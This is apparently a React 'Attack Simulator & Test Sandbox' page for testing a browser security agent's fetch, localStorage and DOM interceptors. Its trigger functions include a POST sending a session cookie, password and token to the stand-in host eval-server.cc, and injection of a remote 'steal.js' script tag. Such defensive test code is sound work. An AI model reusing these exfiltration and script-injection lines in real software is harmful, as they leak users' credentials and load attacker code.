import React, { useState } from 'react';
import { 
  Play, 
  Terminal as TermIcon, 
  ShieldCheck, 
  ShieldAlert, 
  CheckCircle,
  Eye,
  FileCode,
  Flame,
  Key
} from 'lucide-react';

export default function Sandbox() {
  const [terminalLogs, setTerminalLogs] = useState([
    '[SYSTEM] Sandbox testbed environment online. Security agent interceptors loaded.',
    '[SYSTEM] Interceptor proxies active for window.fetch, XMLHttpRequest, and localStorage.',
    '[SYSTEM] DOM Shield observer actively monitoring document elements.'
  ]);

  const addTerminalLog = (msg) => {
    setTerminalLogs(prev => [...prev, `[${new Date().toLocaleTimeString()}] ${msg}`]);
  };

  // Triggers simulated safe standard fetch call
  const triggerSafeFetch = () => {
    addTerminalLog('⚡ Initiating: fetch("/api/health")...');
    
    fetch('/api/health')
      .then(res => res.json())
      .then(data => {
        addTerminalLog(`✓ [ALLOWED] Fetch success. Status: ${data.status}. Channel state verified.`);
      })
      .catch(err => {
        addTerminalLog(`✗ [ERROR] Fetch failed: ${err.message}`);
      });
  };

  // Triggers simulated malicious credential extraction to an untrusted external endpoint
  const triggerUnsafeExfil = () => {
    addTerminalLog('⚡ Initiating: fetch("http://eval-server.cc/exfiltrate?cookie=session_token_xyz", { method: "POST", body: { "password": "root" } })...');
    
    // We target a blocked domain and attach sensitive items, triggering Shrish's agent.
    fetch('http://eval-server.cc/exfiltrate?cookie=session_token_xyz', {
      method: 'POST',
      body: JSON.stringify({ password: 'root_root_root', token: 'user_auth_secret_jwt' })
    })
      .then(() => {
        addTerminalLog('✗ [WARNING] Critical security bypass! Request succeeded - check interceptor configurations.');
      })
      .catch(err => {
        addTerminalLog(`🛡️  [BLOCKED] Zero-Trust Shield triggered: ${err.message}`);
        addTerminalLog('🛡️  Mitigation: Exfiltration dropped. Destination reputational risk calculated above 90.');
      });
  };

  // Triggers simulated suspicious LocalStorage credential storage write
  const triggerLocalStorageWrite = () => {
    addTerminalLog('⚡ Initiating: window.localStorage.setItem("user_jwt_auth_token", "jwt_payload_header_body_sig")...');
    
    try {
      // Set key containing sensitive tags, triggering the localStorage proxy scanner
      window.localStorage.setItem('user_jwt_auth_token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ');
      addTerminalLog('✓ [FLAGGED] Write allowed. Storage proxy logged telemetry event. Authenticating key parsed.');
    } catch (err) {
      addTerminalLog(`✗ [ERROR] Storage writing aborted: ${err.message}`);
    }
  };

  // Triggers simulated dynamic DOM malicious script injection
  const triggerScriptInjection = () => {
    addTerminalLog('⚡ Initiating: DOM Dynamic Script Insertion: <script src="https://raw.githubusercontent.com/malicious-actor/exploit/main/steal.js">...');
    
    try {
      const script = document.createElement('script');
      script.src = 'https://raw.githubusercontent.com/malicious-actor/exploit/main/steal.js';
      script.type = 'text/javascript';
      
      // Injecting element will immediately trigger Maanyat's domShield observer
      document.body.appendChild(script);
      addTerminalLog('✗ [WARNING] Dynamic element injection completed. Scanning lifecycle state.');
    } catch (err) {
      addTerminalLog(`🛡️  [BLOCKED] DOM Shield Observer terminated insertion: ${err.message}`);
    }
  };

  return (
    <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 h-[calc(100vh-6rem)] overflow-y-auto pr-2 select-none">
      
      {/* Playground Actions Console */}
      <div className="space-y-6 flex flex-col justify-between">
        
        <div className="glass-panel rounded-xl border border-cyber-border/40 p-5 space-y-4">
          <div className="flex items-center gap-2.5 border-b border-cyber-border/30 pb-3">
            <div className="p-2 bg-cyber-primary/10 rounded-lg text-cyber-primary">
              <Play className="w-4 h-4 fill-cyber-primary" />
            </div>
            <div>
              <h2 className="font-sans font-bold text-base text-slate-100">
                Attack Simulator & Test Sandbox
              </h2>
              <p className="text-[11px] text-slate-400">
                Trigger sandbox scripts to test dynamic interception and DOM shields
              </p>
            </div>
          </div>

          <p className="text-xs leading-relaxed text-slate-300">
            Simulate standard vs. compromised script scenarios to check agent responsiveness in the current browser runtime. Telemetry events will instantly broadcast via WebSockets.
          </p>

          <div className="space-y-2">
            {/* Trigger 1: Legitimate Call */}
            <div className="p-3.5 rounded-lg bg-cyber-bg/50 border border-cyber-border/20 hover:border-slate-700 transition-colors flex justify-between items-center group">
              <div className="space-y-0.5 pr-4">
                <span className="text-[10px] font-mono text-cyber-success font-bold uppercase tracking-wider block">Legitimate Communication</span>
                <h4 className="text-xs font-bold text-slate-200">Fetch Internal APIs</h4>
                <p className="text-[11px] text-slate-400">Queries local endpoints. Flagged as safe under domain reputation policies.</p>
              </div>
              <button 
                onClick={triggerSafeFetch}
                className="px-3 py-1.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-200 font-mono text-[10px] uppercase font-bold transition-all border border-slate-700"
              >
                Execute
              </button>
            </div>

            {/* Trigger 2: Malicious Exfil */}
            <div className="p-3.5 rounded-lg bg-cyber-bg/50 border border-cyber-border/20 hover:border-slate-700 transition-colors flex justify-between items-center group">
              <div className="space-y-0.5 pr-4">
                <span className="text-[10px] font-mono text-cyber-danger font-bold uppercase tracking-wider block">Network Exfiltration Attempt</span>
                <h4 className="text-xs font-bold text-slate-200">Exfiltrate Credentials to Untrusted Domain</h4>
                <p className="text-[11px] text-slate-400">Attempts to send JWT session tokens to a blocked external address.</p>
              </div>
              <button 
                onClick={triggerUnsafeExfil}
                className="px-3 py-1.5 rounded bg-slate-800 hover:bg-rose-950 hover:text-cyber-danger hover:border-cyber-danger/40 text-slate-200 font-mono text-[10px] uppercase font-bold transition-all border border-slate-700"
              >
                Execute
              </button>
            </div>

            {/* Trigger 3: LocalStorage Write */}
            <div className="p-3.5 rounded-lg bg-cyber-bg/50 border border-cyber-border/20 hover:border-slate-700 transition-colors flex justify-between items-center group">
              <div className="space-y-0.5 pr-4">
                <span className="text-[10px] font-mono text-cyber-warning font-bold uppercase tracking-wider block">Sensitive Storage Write</span>
                <h4 className="text-xs font-bold text-slate-200">Store Credentials in LocalStorage</h4>
                <p className="text-[11px] text-slate-400">Writes session security token blocks. Hooked proxy flags authentication tags.</p>
              </div>
              <button 
                onClick={triggerLocalStorageWrite}
                className="px-3 py-1.5 rounded bg-slate-800 hover:bg-amber-950 hover:text-cyber-warning hover:border-cyber-warning/40 text-slate-200 font-mono text-[10px] uppercase font-bold transition-all border border-slate-700"
              >
                Execute
              </button>
            </div>

            {/* Trigger 4: DOM script Injection */}
            <div className="p-3.5 rounded-lg bg-cyber-bg/50 border border-cyber-border/20 hover:border-slate-700 transition-colors flex justify-between items-center group">
              <div className="space-y-0.5 pr-4">
                <span className="text-[10px] font-mono text-cyber-danger font-bold uppercase tracking-wider block">DOM Script Hijack</span>
                <h4 className="text-xs font-bold text-slate-200">Inject Malicious External script</h4>
                <p className="text-[11px] text-slate-400">Appends an untrusted dynamic script node. Observer drops the element immediately.</p>
              </div>
              <button 
                onClick={triggerScriptInjection}
                className="px-3 py-1.5 rounded bg-slate-800 hover:bg-rose-950 hover:text-cyber-danger hover:border-cyber-danger/40 text-slate-200 font-mono text-[10px] uppercase font-bold transition-all border border-slate-700"
              >
                Execute
              </button>
            </div>

          </div>
        </div>
      </div>

      {/* Real-time Sandbox Console Output */}
      <div className="glass-panel rounded-xl border border-cyber-border/40 p-5 flex flex-col h-full min-h-[400px]">
        <div className="flex items-center gap-2 mb-4 shrink-0 select-none">
          <TermIcon className="w-4 h-4 text-slate-400" />
          <div>
            <h3 className="font-sans font-bold text-sm text-slate-100">
              Sandbox Telemetry Console
            </h3>
            <span className="text-[11px] text-slate-400 block mt-0.5">
              Live debugger stream detailing proxy block event outputs
            </span>
          </div>
        </div>

        <div className="flex-1 cli-terminal p-4 rounded-lg overflow-y-auto space-y-2 text-cyan-200 font-mono text-xs leading-relaxed">
          {terminalLogs.map((log, idx) => (
            <div key={idx} className="whitespace-pre-wrap break-all border-b border-slate-800/40 pb-1.5 last:border-0">
              {log}
            </div>
          ))}
        </div>

        <div className="mt-3 text-right">
          <button
            onClick={() => setTerminalLogs([])}
            className="text-[10px] font-mono border border-slate-700 hover:border-slate-500 px-2.5 py-1 rounded text-slate-400 hover:text-slate-200 transition-all uppercase font-bold"
          >
            Clear Console
          </button>
        </div>
      </div>

    </div>
  );
}
